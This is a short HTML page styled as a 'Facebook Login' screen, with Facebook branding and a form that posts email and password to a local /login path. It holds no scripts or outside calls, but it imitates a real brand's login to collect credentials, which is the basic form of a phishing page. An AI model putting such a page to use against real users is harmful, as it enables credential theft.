<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>

  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding:0;
    }

    #header {
      background-color: blue;
      color: white;
      padding: 20px;
    }

    h1 {
      font-size: 30px;
    }

    p {
      font-size: 16px;
    }

    #main {
      display: flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
    }

    #login-form {
      width: 300px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    h2 {
      font-size: 20px;
      margin-bottom: 20px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin-bottom: 10px;
    }

    button {
      width: 100%;
      background-color: blue;
      color: white;
      padding: 10px;
      margin-bottom: 10px;
    }

    #footer {
      background-color: black;
      color: white;
      padding: 20px;
      position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
    }
  </style>
</head>
<body>

  <div id="header">
    <h1>Facebook</h1>
    <p>Connect with friends and the world around you.</p>
  </div>

  <div id="main">
    <div id="login-form">
      <h2>Log In</h2>
      <form action="/login" method="post">
        <input type="email" name="email" placeholder="Email or Phone Number">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Log In</button>
      </form>
    </div>
  </div>

  <div id="footer">
    <p>Copyright &copy; 2023 Facebook</p>
  </div>

</body>
</html>
